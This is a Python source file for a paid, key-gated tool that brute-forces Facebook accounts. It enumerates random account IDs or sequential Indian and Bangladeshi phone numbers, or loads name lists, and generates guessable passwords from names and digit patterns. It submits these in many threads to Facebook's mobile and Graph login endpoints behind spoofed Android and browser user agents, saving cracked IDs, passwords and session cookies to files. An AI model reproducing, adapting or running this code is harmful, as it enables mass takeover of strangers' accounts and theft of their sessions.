import os, sys, uuid, re, random, time, string, json,base64
from io import BytesIO
try:
	
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
	import requests, rich,certifi,pycurl
except:
    os.system("git pull")
    
    os.system("pip3 install requests rich certifi pycurl")
    
    import requests, rich,certifi,pycurl


from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

version = "  v1"


# get system data


class sort:
    def line():
        return "[b dark_sea_green2]━" * 37

    def clear():
        os.system("clear")

    def logo():
        aci = f'''    //   ) )                                      
   //___/ /  __     ( )   __      ___      ___    
  / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
 //       //      / / //   / / //       //        
//       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Paid[/r]\n{sort.line()}'''
        print(aci)

    def color():
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        cx = random.choice(co)
        return cx





def info():
    sort.clear()
    print('     [b]    [red1] WELCOME TO MY TOOL          ')
    if not os.path.exists('device_info.txt'):
        os.system('clear')
        print(sort.logo())
        print(" What is your android version ex 8,9,10")
        version_ = input(' Type android version : ')
        print(44 * '-')
        print(" Your mobile model ex Techno LD7 or Oppo CPH2095 etc")
        model_ = input(" Model name : ")
        print(44 * "-")
        print(" Your mobile company name ex Techno,Redmi")
        brand_name_ = input(" Device company name : ")
        print(44 * '-')
        print(" Your mobile width ex 720,740,730,780 etc")
        width_ = input(" Device width : ")
        print(44 * '-')
        print(" Your mobile height ex 1660,1780,1730 etc")
        height_ = input(" Device height: ")
        info_file = open("device_info.txt", "a").write(
            version_ + '$' + model_ + '$' + brand_name_ + '$' + width_ + '$' + height_)
    time.sleep(4)
    sort.clear()
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN MESSANGER GROUP ... ")
    # os.system("xdg-open https://www.facebook.com/HeronAfridi.Official");time.sleep(2)
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]REVIEW TOOL OWNER ... ")
    # os.system("xdg-open https://m.me/j/AbYhZTf4PCEUXDNP/");time.sleep(2)
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN CHANNEL ... ")
    # os.system("xdg-open https://t.me/TeamElite_Channel");time.sleep(2)


# ---------# Global
oks = []
loop = 0
sys_ua = []


def cont(li):
    if li < 10:
        return "0" + str(li)
    else:
        return str(li)


# ---------# Date
month = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July",
         "08": "August", "09": "September", "10": "October", "11": "November", "12": "December", }
today_data = str(datetime.now()).split(" ")[0].split("-")
today = today_data[2] + "\x1b[1;97m." + month.get(today_data[1])


# ---------#Old Date
def ua():
    rr = random.randint
    aZ = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
    return xx

#"Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+377.0.0.13.101;FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"

#Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]

#Dalvik/2.1.0 (Linux; U; Android 13; Oppo CPH2095 Build/TW8A.198993.015) [FBAN/Orca-Android;FBAV/279.1.0.51.155;FBPN/com.facebook.orca;FBLC/en_US;FBBV/398105929;FBCR/MTN;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo CPH2095;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;]


for brand in range(1000):
    a = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    b = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    c = str(random.randint(1,9))
    d= str(random.randint(10,20))
    abc = a+b+c
    if not os.path.exists('device_info.txt'):
    	 info()
    else:
        infos = open('device_info.txt', 'r').read()
        version_, model_, brand_name_, width_, height_ = infos.split('$')
        uaaa = "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/"+abc+"A."+str(random.randint(190000,199999))+".0"+d+") [FBAN/Orca-Android;FBAV/"+str(random.randint(200,350))+"."+str(random.randint(0,1))+".0."+str(random.randint(20,70))+"."+str(random.randint(110,280))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.randint(390000000,399999999))+";FBCR/MTN;FBMF/"+brand_name_+";FBBD/"+brand_name_+";FBDV/"""+model_+";FBSV/"+version_+";FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width="+width_+",height="+height_+"};FB_FW/1;]"
        sys_ua.append(uaaa)
    


def Samsung():
    Anderson = random.choice(
        ["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5", "4.4.2", "5.1.1",
         "6.0.1", "9.0.1"])
    model = random.choice(
        ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
         "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F",
         "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android " + Anderson + "; " + model + " Build/LRX22C) [FBAN/" + FBAN + ";FBAV/" + cho + ".0.0.15.89;FBPN/" + platform + ";FBLC/sv_SE;FBBV/" + vir + ";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/" + model + ";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=" + str(
        random.choice(range(1, 4))) + ".0,width=" + str(random.choice(range(720, 1500))) + ",height=" + str(
        random.choice(range(1500, 2000))) + "};FB_FW/1;]"
    return ua


# -----------#
def Motorola():
    fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))  # "+rdp1+"
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))  # "+andv+"
    # modorola
    ua = "Dalvik/2.1.0 (Linux; U; Android " + andv + ".0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/" + fb_v1 + ".0.0.50." + fb_v2 + ";FBPN/com.facebook.katana;FBLC/es_MX;FBBV/" + rdp1 + ";FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/" + andv + ".0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]"

    return ua


def Vivo():
    fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))  # "+rdp1+"
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))  # "+andv+"
    # vivo
    ua = "Dalvik/2.1.0 (Linux; U; Android " + andv + ".1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/" + fb_v1 + ".0.0.16." + fb_v2 + ";FBPN/com.facebook.orca;FBLC/en_US;FBBV/" + rdp1 + ";FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/" + andv + ".1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"

    return ua

def lsb():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
    number = ''.join(random.choices(string.digits, k=1))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)


def referer():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
    number = ''.join(random.choices(string.digits, k=5))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)

# -----------#


def old():
    user = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]Crack 2011-14 Id")
    print("[b]    [red1][B] [spring_green1]Crack 2009-10 Id")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    if ask in ["1", "01", "a", "A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2011-14")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        star = "10000"
        for i in range(limit):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    else:
        star = "100000"
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2009-10")
        print(sort.line())
        print("  [b]   [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    print("[b]    [red1][1] [sea_green2]Method A")
    print("[b]    [red1][2] [spring_green1]Method B")
    print(sort.line())
    meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    with ThreadPool(max_workers=40) as heron:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
        print(" [b]    [red1]✗ [light_green]Login Ids [orange3]▶  [light_green]Just Now")
        print(sort.line())
        for mal in user:
            uid = star + mal
            heron.submit(login, uid, meth)


def filee():
    sort.clear()
    sort.logo()

    print("[b]    [red1][A] [sea_green2]Crack Indian File")
    print("[b]    [red1][B] [spring_green1]Crack BD File")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if ask in ["1", "01", "a", "A"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND File Clone")
        print(sort.line())
        time.sleep(2)
        pwx = ["07860786", "57575751", "57575752", "57273200", "59039200", "first123", "first 123", "first1234",
               "First123", "First1234", "first@123", "first last", "First Last", "firstlast", "firstlast123",
               "firstlast1234", "first@#", "first@@", "@first", "@first@", "first12"]

    elif ask in ["2", "02", "b", "B"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD File Clone")
        print(sort.line())
        time.sleep(2)
        pwx = ["first12", "first123", "first1234", "first12345", "first123456", "firstlast", "firstlast123",
               "firstlast1234", "first@123", "first@", "first@@", "first@#", "@first", "@first@", "firstlast12345",
               "firstlast@#", "firstlast@@", "firstlast@", "First123", "First1234", "first last", "First Last",
               "last123", "Name", "name", "name123", "Name", "firstlast12", "FirstLast123", "FirstLast1234",
               "FirstLast@#", "FirstLast@@"]

    else:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
        print(sort.line())
        time.sleep(2)
        filee()
    print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]/sdcard/File.txt")
    path = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))

    print(sort.line())
    try:
        file = open(path, "r").read().splitlines()
    except:
        filee()
    print("[b]     [red1]✗ [chartreuse1]Add Pass  [orange3]▶  [chartreuse1](Y/n)")
    pa = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
    if pa in ["y", "Y", "yes", "Yes", "1"]:
        pwx = []
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Add Limit [orange3]▶  [chartreuse1]Example 10, 15, 20")
        lim = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        for i in range(lim):
            i += 1
            print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]first123,firstlast")
            px = str(input(
                f"\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mPass  {cont(i)} \x1b[38;5;208m ▶ \x1b[38;0;196m "))
            print(sort.line())
            pwx.append(px)
    else:
        print(sort.line())
    print("[b]    [red1][1] [spring_green1]Method 1")
    print("[b]    [red1][2] [spring_green1]Method 2")
    print("[b]    [red1][3] [spring_green1]Method 3")
    print("[b]    [red1][4] [spring_green1]Method 4")
    print("[b]    [red1][5] [spring_green1]Method 5")
    print(sort.line())
    meth = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))

    with ThreadPool(max_workers=80) as heron:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(file)))
        print(" [b]    [red1]✗ [light_green]Method    [orange3]▶  [light_green]M" + meth)
        print(sort.line())
        for mal in file:
            try:
                uid = mal.split("|")[0]
                name = mal.split("|")[1]
                heron.submit(file_sub, uid, pwx, name, meth, file)
            except:
                pass


def file_sub(uid, pwx, name, meth, file):
    global oks, loop, sys_ua
    Session = requests.session()
    shadid = random.choice(sys_ua)
    custom_agent = ""
    try:
        sys.stdout.write(
            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        for pw in pwx:

            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                          ls).replace(
                'Name', name).replace('name', name.lower())

            if meth in ["1", "01"]:
                agent = shadid
            elif meth in ["2", "02"]:
                agent = Vivo()
            elif meth in ["3", "03"]:
                agent = Motorola()
            elif meth in ["4", "04"]:
                agent = Samsung()
            else:
                agent = custom_agent
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": uid,
                "password": ps,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_GB",
                "client_country_code": "GB",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
                'User-Agent': agent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', }
            url1 = 'https://b-graph.facebook.com/auth/login'
            po = Session.post(url=url1, data=data, headers=head, allow_redirects=False).json()

            if "session_key" in po:
                oks.append(uid)
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                print(
                    f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/pyc_file.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                print(
                    f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/pyc_file.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                break
            else:
                continue
        loop += 1
    except:

        time.sleep(30)


def ran():
    user = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]IND Number Clone")
    print("[b]    [red1][B] [spring_green1]BD Number Clone")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if ask in ["1", "01", "a", "A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND Number")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]+91629, +91701")
        code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(int(code) + i)
            user.append(data)
    else:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Type A BD Number EX   [orange3]▶  [chartreuse1]01718702440")
        code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(int(code) + i)
            user.append(data)
    print(" Method 1(Best)")
    print(" Method 2")
    print(" Method 3")
    print(" Method 4")
    print(" Method 5")
    print(" Method 6")
    print(sort.line())
    meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if meth in ["1", "a", "A"]:
        fb = "mbasic"
    elif meth in ["2", "b", "B"]:
        fb = "x"
    elif meth in ["3", "c", "C"]:
        fb = "p"
    elif meth in ["4", "d", "D"]:
        fb = "touch"
    elif meth in ["5", "e", "E"]:
        fb = "free"
    else:
        fb = "m"
    if meth in ["1", "a", "A"]:
    	mw = 30
    else:
    	mw = 90
    with ThreadPool(max_workers=mw) as heron:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
        print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
        print(sort.line())
        for xd in user:
            uid = "0" + xd
            if ask in ["1", "01", "a", "A"]:
                pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[1:]]
            else:
                pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:]]   # , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
            heron.submit(ren_sub, uid, pwx, meth, user, fb)


def ren_sub(uid, pwx, meth, user, fb):
    global oks, loop
    shadid = random.choice(sys_ua)
    custom_agent = ""
    session = requests.Session()
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
    sys.stdout.flush()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                    "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
            uax = ua()
            ver1 = str(random.randrange(1, 99))
            ver2 = str(random.randrange(90, 121))
            lsd = lsb()
            refer = referer()
            dpr = str(random.randrange(2, 6))
            sceme = random.choice(['light', 'dark'])
            had = {
                'Host': f'{fb}.facebook.com',
                'content-length': str(random.randrange(1600, 1800, 10)),
                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
                'sec-ch-ua-mobile': '?1',
                'user-agent': uax,
                'x-response-format': 'JSONStream',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': lsd,
                'viewport-width': '360',
                'sec-ch-ua-platform-version': '""',
                'x-requested-with': 'XMLHttpRequest',
                'x-asbd-id': '129477',
                'dpr': dpr,
                'sec-ch-ua-full-version-list': '',
                'sec-ch-ua-model': '""',
                'sec-ch-prefers-color-scheme': sceme,
                'sec-ch-ua-platform': '"Android"',
                'accept': '*/*',
                'origin': f'https://{fb}.facebook.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
                'accept-encoding': 'gzip, deflate, br,',
                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url, data=info, headers=had)
            heron_brand = session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15]
                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}\n")
                open("/sdcard/SD-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                oks.append(xd)
                break
                    
            elif "checkpoint" in heron_brand:
                pass

                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
            else:
                continue
        loop += 1
    except Exception as e:
        time.sleep(30)



def main():
    info()
    sort.clear()
    sort.logo()
    print(
        "[b]    [red1][A] [chartreuse1]File Clone [blue][[green]B[red1]D[blue]-[orange1]I[white]N[bright_green]D[blue]]")
    print("[b]    [red1][B] [spring_green2]Old Uid Clone")
    print("[b]    [red1][C] [spring_green1]Random (more..2)")

    print(sort.line())
    fast_choice = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if fast_choice in ["1", "01", "a", "A"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]File Clone")
        print(sort.line())
        time.sleep(2)
        filee()
    elif fast_choice in ["2", "02", "b", "B"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Old Uid Crack")
        print(sort.line())
        time.sleep(2)
        old()
    elif fast_choice in ["3", "03", "c", "C"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Random Crack")
        print(sort.line())
        time.sleep(2)
        ran()
    else:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
        print(sort.line())
        time.sleep(2)
        main()


def login(uid, meth):
    global oks, loop
    Session = requests.session()
    try:
        sys.stdout.write(
            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789"]:
            if meth in ["1", "01", "A", "a"]:
                agent = ua()
            else:
                agent = Samsung()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": agent,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"}
            rp = Session.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers).json()
            if "session_key" in rp:
                oks.append(uid)
                print(
                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
                break
            elif "Please Confirm Email" in str(rp):
                oks.append(uid)
                print(
                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
                break

            else:
                continue
        loop += 1
    except:
        time.sleep(30)

K1=str(os.getuid())
K2=str(os.getgid())
num_key="".join(K1+K2)

cm=num_key.encode("ASCII")
cmr=base64.b64encode(cm)
cm2=str(cmr).upper().replace("B","$")
showkey=cm2.replace("'","").replace("==","")

def approve():
    url="https://github.com/Shadid21/Prince/blob/main/approval.txt"# Your Link
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8')
    except:
        sys.exit("[!!] Internet Error...")
    
    if showkey in datax:
    	
        print("Checking Subscription")
        time.sleep(3)
        main()
    else:
        sort.logo()
        
        print("your Key ->   "+showkey)
        input("This is paid tool bro. If you want to buy press enter. ")
